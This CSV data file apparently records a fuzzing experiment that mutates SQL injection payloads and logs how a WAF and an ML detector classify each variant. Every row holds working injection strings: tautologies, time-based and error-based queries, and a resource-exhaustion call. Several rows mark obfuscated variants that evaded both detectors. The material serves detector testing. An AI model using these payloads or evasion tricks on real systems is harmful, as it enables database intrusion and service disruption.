Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
1,2024-12-16T16:39:20.363639,1'  )   as tqdg where 9355  =  9355,403,403,200,waf_correct_ml_incorrect,"1'  )   aS tqdg WHERE
9355   liKe   (SeLECT/**/5669<>(selEct 1))",2024-12-16T16:39:22.863597,403,403,both_correct,"1983 NOT LIKE 1984'
 )/**/  as tqdg wHere
 || 0   LIKE   (SeleCt/**/0x1625<>(SeleCt 1))",2024-12-16T16:39:27.014912,403,200,waf_correct_ml_incorrect,"2212=2212 NOT LIKE 1984'
 )/*W:{*/  as tqdg wHERe	  OR  (SElect 0)   Like   (sElECt 0x1625<>(SELECt  AND 1))",2024-12-16T16:39:32.515484,403,403,both_correct," aNd 'x' not like 'x\'=2212/**/NOT LIKE 0x7c0'
	)/*W:{*/  as tqdg whERE	  oR  (seleCT 0)   lIKe   (sElEct 0x1625<>(seLeCT  anD 1))",2024-12-16T16:39:39.182496,403,200,waf_correct_ml_incorrect," And 'x' not like 'x\'=0x8a4 NOT LIKE 0x7c0'

)/*Y|JF*/  As tqdg wHerE	  Or  (sElect  Or 0)   LiKe   (SEleCT 0x1625 NOT LIKE (seLECT  And 5126 IN (5125,5126,5127)))",2024-12-16T16:39:46.605962,403,403,both_correct
2,2024-12-16T16:39:55.520243,"1%'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",403,403,200,waf_correct_ml_incorrect,"'Rb' NOT LIKE 'Rbh'%'   )    )     )  	or  AND 0x1/**/  LIKE     (  SElect count  (  *  )   from domain.domains as t1,domain.columns aS t2,domain.tables As t3  )  --",2024-12-16T16:40:02.237930,200,200,both_incorrect,"'Rb' not like 'Rbh'%'   )    )   	 )  	oR  aND 0x1   likE     (  SelEcT count  (  *  )   frOm domain.domains AS t1,domain.columns As t2,domain.tables aS t3  )  --",2024-12-16T16:40:11.604780,200,200,both_incorrect,"'Rb' not like 'Rbh'%'   )    )   	 ) /*nU(v*/	Or  and 0x1   LiKe     (  sElEct count  ( 	*  )   FrOm domain.domains As t1,domain.columns As t2,domain.tables aS t3  )  --",2024-12-16T16:40:21.315507,200,200,both_incorrect,"'Rb'/*?}I0*/not like 'Rbh'%'   )    )     ) /*nU(v*/	oR  aNd 0x1   LiKe     (  seLEct count  ( 	*  )   FrOM domain.domains As t1,domain.columns As t2,domain.tables as t3  )  --",2024-12-16T16:40:30.509414,200,200,both_incorrect,"'Rb'/*?}I0*/not like
'Rbh'%'   )    )     ) /*nU(v*/	oR  AnD 0x1   likE    /**/(  SELECt count  ( 	*  )   froM domain.domains aS t1,domain.columns AS t2,domain.tables as t3  )  --",2024-12-16T16:40:40.055466,200,200,both_incorrect
3,2024-12-16T16:40:49.612685,-1127 or 7391  =  4954,403,403,403,both_correct,"-1127 or
 OR/**/0<>6639  =  (SeLeCT 4954)",2024-12-16T16:40:50.776840,200,200,both_incorrect,-'1`' lIKE '1`' or	 OR 0!=(SeLeCt  anD 1)  =  (SeLECt 4954),2024-12-16T16:40:53.868986,200,403,waf_incorrect_ml_correct,-'(SELECT (SELECT 8777<>8778))`' LiKE '1`' Or /**/Or 0 NOT LIKE (SELeCt  aNd 1)  =  (sELecT 4954),2024-12-16T16:40:57.787649,403,403,both_correct,-'(SELECT (SELECT 8777<>(SELECT 641<>642)))`' Like '1`' oR  OR 0 not like (SELECT	 And 1)  =  (selecT 0x135a),2024-12-16T16:41:03.519014,403,403,both_correct,"-'(SELECT (SELECT 8777<>(SELECT 1045 NOT LIKE 1046<>642)))`' LikE '(SELECT 1)`' oR  OR  aNd 1 not like
(seLeCT	/**/And 1)   LIke   (sELECT 0x135a)",2024-12-16T16:41:10.003215,403,403,both_correct
4,2024-12-16T16:41:17.916278,"select count  (  *  )   from generate_series  (  1,5000000  )  --",403,403,403,both_correct,"SEleCT count 
(  *  )   froM generate_series  ( /*%|*/0x1, AnD 7385 In (7384,7385,7386)  )  --",2024-12-16T16:41:21.077096,403,403,both_correct,"SElect count 	(  *  )/**/  frOm generate_series  ( /*%|*/0x1, ANd 0x1cd9 in ( OR 0,7385,'V' LIKE 'V')  )  --",2024-12-16T16:41:26.628588,403,200,waf_correct_ml_incorrect,"seLECt count  (  *  )/*Isk*/  fRoM generate_series  ( /*%|*/0x1, AnD 0x1cd9 iN ( or  aNd '2'<>'0x2>',7385,'V' LIKe/**/'V')  )  --",2024-12-16T16:41:32.779072,403,200,waf_correct_ml_incorrect,"SeLECT count  (  *  )/*cYT*/  from generate_series  ( /*%|*/0x1, aND 0x1cd9 iN (	oR  aNd '2'<>'0x2>',6529<>(SeLECT  AND 1),'V' LIKe/**/'V')/**/ )  --",2024-12-16T16:41:40.206322,403,403,both_correct,"selECt count  (  *  )/*),&*/  from generate_series  ( /*%|*/0x1, aND 0x1cd9/**/iN (
or  AnD '0x2'<>'0x2>', AND 1<>(sELect  aND '^he""'='^he""'),'V' Like/**/'V')/**/ )  --",2024-12-16T16:41:48.365201,403,200,waf_correct_ml_incorrect
5,2024-12-16T16:41:57.193028,1   )    )    and 9198  =  9198--,403,403,200,waf_correct_ml_incorrect,(SELEcT  AnD 1)  	)    )   /**/anD 9198  =  '-' LIKE '-'--,2024-12-16T16:41:58.819492,403,403,both_correct,"(SeleCT  And '5'=' AND 1') /**/	)    )  
/**/aND (SELECT 9198)   like   '-' like '-'--",2024-12-16T16:42:02.910364,403,403,both_correct,"(SELEcT  aND ' OR '%'!='%""'' LIKE ' AND 1') /**/ )  /**/ )  
/**/And (SELECT 0x23ee)   lIKe   '-' liKE '-'--",2024-12-16T16:42:08.047104,403,403,both_correct,"(seLEcT  AND ' OR '%'!='%""'' LiKE ' AND (SELECT (SELECT 1)) NOT LIKE 4480')   )  /*7sdzh*/ )
 
/**/AND (sELECT 0x23ee)   Like   '-' lIKe '-'--",2024-12-16T16:42:14.118913,403,403,both_correct,"(SelEct  AnD ' OR '%'!='%""'' LikE ' AND (SELECT (SELECT (SELECT 1))) NOT LIKE 3702= OR 0')  /**/)  /*7sdzh*/ )
  /**/&& (seLeCT 0x23ee)   LIke   '-' liKe '-'--",2024-12-16T16:42:21.739022,403,403,both_correct
6,2024-12-16T16:42:30.643026,"1%'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",403,403,200,waf_correct_ml_incorrect,"1%'
  )    )    OR char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  0x53  )    =  regexp_substring  (  repeat  (  LEfT  (  crypt_key  (  char  (  65  )  ||char  (   AND 1  )  ||char  (  83  )  ,null /*zs2*/)  ,';|' LIKE ';|'  )  ,500000000  )  ,null  )  --",2024-12-16T16:42:42.050337,403,200,waf_correct_ml_incorrect,"1%'	  )    )    OR char  (  75  )  ||char  (  4011 IN (4010,4011,4012)  )  ||char  (  99  )  ||char  (  0x53  )    =  regexp_substring  (  repeat  (  LEfT  (  crypt_key  (  char  (  65  )  ||char  (   AND (SELECT 1)  )  ||char  (  (SELECT 1)  )  ,null /**/) /**/,';|' LIKE ';|'  )  ,500000000  )  ,null  )  --",2024-12-16T16:42:55.959689,403,403,both_correct,"1%'	  )    )    OR char  (  75  )  ||char  (  (SELECT 'j'='j') IN (4010,4011,4012)  )  ||char  (   OR 0  )  ||char  (  0x53  )    =  regexp_substring  (  repeat  (  LEfT  (  crypt_key  (  char  (
 65  )  ||char  (   AND (SELECT 1)  )  ||char  (  (SELECT 1)  )  ,null /**/) /**/,';|' LIKE ';|'  )  ,500000000  )  ,null/**/ )  --",2024-12-16T16:43:11.393552,403,403,both_correct,"1%'	  )    )    OR char  (  75  ) /**/||char  (  (SELECT 'j'='j') IN (6789 LIKE  OR 0,4011,0xfac)  )  ||char  (   OR 0  )  ||char  (  0x53  )    =  regexp_substring  (  repeat  (  LEfT  (  crypt_key  (  char  (  65  )  ||char  (   AND (SELECT 1)  )  ||char  (  (SELECT 1)  )  ,null /**/) /**/,';|' LIKE ';|'  )  ,500000000  )  ,null/*<*/ )  --",2024-12-16T16:43:27.849788,403,403,both_correct,"'|' NOT LIKE '|['%'	  )    )    OR char  (  75  ) /**/||char  (  (SELECT 'j'='j') IN (6789 LIKE  OR 0,4011,0xfac)  )  ||char  (   OR 0x0  ) /**/||char  (  0x53  )    =  regexp_substring  (  repeat  ( 	LEfT  (  crypt_key  (  char  (  65  )  ||char  (   AND (SELECT 1)  )  ||char  (  (SELECT  OR 0)  )  ,null /**/) /**/,';|' LIKE ';|'  )  ,500000000  )  ,null/*<*/ )  --",2024-12-16T16:43:45.166818,200,403,waf_incorrect_ml_correct
7,2024-12-16T16:44:03.464154,8.04589E+15,200,200,200,both_correct,"0x8.04589E+
or/**/'g&
' LIKE 'g&
'",2024-12-16T16:44:04.174921,200,403,waf_correct_ml_incorrect,"0x8.04589E+
oR/*6A*/'g&
'/**/like
'g&
'",2024-12-16T16:44:06.956836,200,200,both_correct,"0x8.04589E+
oR/**/'g&
'
LIke
'g&
'",2024-12-16T16:44:09.917592,200,200,both_correct,"0x8.04589E+
oR 'g& '
LiKe
'g&
'",2024-12-16T16:44:12.662667,200,200,both_correct,"0x8.04589E+
or/**/'g&
'
LIkE
'g&
'",2024-12-16T16:44:15.272802,200,200,both_correct
8,2024-12-16T16:44:17.993803,2925,200,200,200,both_correct,(SELECT	(SELECT 4950 not like 4951)),2024-12-16T16:44:18.307839,403,403,both_incorrect,"(seLEct	(SelEcT  OR 0<>(SELECT/**/3878) not
like 4951))",2024-12-16T16:44:21.100079,403,200,waf_incorrect_ml_correct,"(sEleCT
(SelECT /**/oR  aNd '&Bf3'='&Bf3'<>(seLect/*p,Wgh*/0xf26) not
like 4951))",2024-12-16T16:44:24.765203,403,200,waf_incorrect_ml_correct,"(SeLect
(sELect  or  aNd '&Bf3'='&Bf3'!=(seleCT/*W91U**/0xf26) not	like  OR (SELECT 2202=2202)))",2024-12-16T16:44:29.669149,403,403,both_incorrect,"(SElEcT
(seLeCT/**/ or  anD '&Bf3'='&Bf3'<>(SElECt/*W91U**/0xf26) not like  OR (seLeCT '=L' likE '=L'=0x89a)))",2024-12-16T16:44:35.238683,403,200,waf_incorrect_ml_correct
9,2024-12-16T16:44:41.825994,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",403,403,200,waf_correct_ml_incorrect,"1067 not like 1068  )   ANd 8407  =    (  SElecT count  (  *  )  
fRom generate_series  (  1,5000000   )    )    AnD   (  2160/*L*/ =  (SeLECt  or 0)",2024-12-16T16:44:47.560934,403,200,waf_correct_ml_incorrect,"1067 not like 1068  )   And 8407  =    (  SELECT count  (  *  )   FRom generate_series  (  1,5000000   )    )    aNd  /**/(   or '' LIKE ''/*L*/ =  (SelECt  or 0x0)",2024-12-16T16:44:55.623686,403,403,both_correct,"1067 not like 1068  )   and 'oA' not like 'oA%'  =    (  seLECT count  (  *  )   fRom generate_series  (  0x1, AND 1   ) 	  )    and   (   Or '' lIkE ''/**/ =  (SeLeCT  OR 0x0)",2024-12-16T16:45:04.857944,403,200,waf_correct_ml_incorrect,"(SELECT 1067) not like  or 0  )   ANd 'oA' not like 'oA%'  =    (  SeLECt count  (  *  )   FROM generate_series  (  0x1, anD 'E'!='E?'   ) 
  )    AnD   (   or '' likE ''  =  (SELEct  or 0x0)",2024-12-16T16:45:14.184794,403,403,both_correct,"(seleCt  OR 0x0) not like  OR '}q'='}q'  )   aNd 'oA' not like 'oA%'   Like  	  (  sELeCt count  (  *  )/**/  fROm generate_series  (  0x1, AND 'E'!='E?'   ) 
  )    AND   (   oR '' likE ''  =  (sElECt  OR 0x0)",2024-12-16T16:45:24.299593,403,200,waf_correct_ml_incorrect
10,2024-12-16T16:45:35.462100,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",403,403,403,both_correct,"1""/*U[*/ )   as mwja whErE 375 LIKE (SELECT 375)  =  7881 And row  (  6237,7469  )  >  (  seleCt count  (  *  )  ,concat  (  0x7171706a71,  (  SEleCT   (  elt  (  6237   LIKE   (SELECT 1),1   )	   )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x FROm   (  SeLeCt 5192 union SeLECt 3785 union seleCT 3931 union seLeCT 7158  )  a group by x  )  --",2024-12-16T16:45:50.972601,403,403,both_correct,"1""/*WlSx+*/ )   as mwja wherE 375 like (sElect 375)   lIKE   'i'!='i[' AND row  (  6237,7469  )  >  (  SeLEct count  (  *  )  ,concat  (  0x7171706a71,  (  SELeCt   (  elt  (   AND 1   lIKE   (seLECT 1),1   )    )     )  ,0x717a767a71,floor  (  rand/**/ (  0  )  *2   )    )   x FROM   (  SEleCT 5192 union SeLeCT 3785 union SEleCT 0xf5b union selecT 7158  )  a group by x  )  --",2024-12-16T16:46:08.970619,403,200,waf_correct_ml_incorrect,"1""/*WlSx+*/ )   as mwja wherE 375 LIkE (SElecT 375)   liKE   'i'!='i[' and row  (  7975!=7976,7469  )  >  (  seLect count  (  *  )  ,concat  (  0x7171706a71,  (  selEcT   (  elt  (   AND  oR 0   lIkE   (seLECT 1),(SELEcT 1)   )    )     )  ,0x717a767a71,floor  (  rand  (  0  ) 	*2   )    )   x froM   (  seLECt 5192 union sElEct 3785 union seLEcT 0xf5b union sEleCt 7158  )  a group by x  )  --",2024-12-16T16:46:27.840100,403,200,waf_correct_ml_incorrect,"1""/**/ )   AS mwja WhERE 0x177 LiKE (SElECT  and 1)   likE   'i'!='i[' anD row  (  7975!=7976,7469  )  >  (  seLeCT count  (  *  )  ,concat  (  0x7171706a71,  (  SELeCt   (  elt  (   AND  Or 0   lIke   (SelECt 6566<>6567),(selECT 1)   )    ) /**/   )  ,0x717a767a71,floor  (  rand  (  0  ) 	*2   )    )   x fROm   (	 sEleCt 5192 union SELeCT 3785 union SEleCT 0xf5b union SelEct 7158  )  a group by x  )  --",2024-12-16T16:46:47.588550,403,200,waf_correct_ml_incorrect,"(SELECT 1)""/*BF4*/ )   as mwja wHERe 0x177 lIKE (sELect  AnD 1)   LIKE   'i'!='i[' and row  (  7975!= OR 0,7469  )  >  (  SElECt count  (  *  )  ,concat  (  0x7171706a71,  (  sEleCt   (  elt  (   anD  oR 0   likE   (sElect 'JR#,|' NOT LIKE 'JR#,|F'<>6567),(SeLeCt 1)   )    )     )  ,0x717a767a71,floor  (  rand  (	 0  ) 	*2   )    )   x frOm   (	 sEleCt 5192 union SElEct 3785 union SELect 0xf5b union sELect 7158  )  a group by x  )  --",2024-12-16T16:47:07.903703,403,200,waf_correct_ml_incorrect
